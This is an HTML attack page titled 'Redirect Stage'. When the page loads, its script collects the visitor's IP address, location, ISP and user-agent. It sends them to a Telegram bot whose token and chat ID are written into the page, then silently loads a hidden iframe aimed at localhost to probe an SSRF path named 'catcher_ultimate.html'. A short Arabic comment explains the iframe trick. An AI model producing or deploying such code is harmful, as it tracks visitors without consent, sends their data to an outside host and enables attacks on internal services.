<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirect Stage</title>
  <script>
    async function getIPInfo() {
      try {
        const res = await fetch("https://ipinfo.io/json?token=be5998b85f541c");
        return await res.json();
      } catch (e) {
        return {};
      }
    }

    async function sendToTelegram(message) {
      const token = "8182692132:AAGPJzf4tOZ7be5vrvd3RD3RJFZoEbmq1zg";
      const chat_id = "6239813037";
      const url = `https://api.telegram.org/bot${token}/sendMessage`;
      await fetch(url, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({chat_id, text: message, parse_mode: "Markdown"})
      });
    }

    function formatMessage(data) {
      return `📄 *[REDIRECT STAGE]*
🚪 *Redirecting to:* http://127.0.0.1:80
🌐 *IP:* ${data.ip || "Unknown"}
📍 *City:* ${data.city || "Unknown"}
🌎 *Country:* ${data.country || "Unknown"}
🏢 *ISP:* ${data.org || "Unknown"}
🧠 *User-Agent:* \`${navigator.userAgent}\`
🕒 *Timestamp:* ${new Date().toISOString()}`;
    }

    async function run() {
      const ipData = await getIPInfo();
      const msg = formatMessage(ipData);
      await sendToTelegram(msg);

      // بدل ما نعمل redirect مباشر للـ localhost، نحط iframe
      const iframe = document.createElement("iframe");
      iframe.style.display = "none";
      iframe.src = "http://127.0.0.1:80/ssrf-check/catcher_ultimate.html"; // هنا المهم!
      document.body.appendChild(iframe);
    }

    window.onload = run;
  </script>
</head>
<body>
  <h1>Redirecting to SSRF...</h1>
</body>
</html>
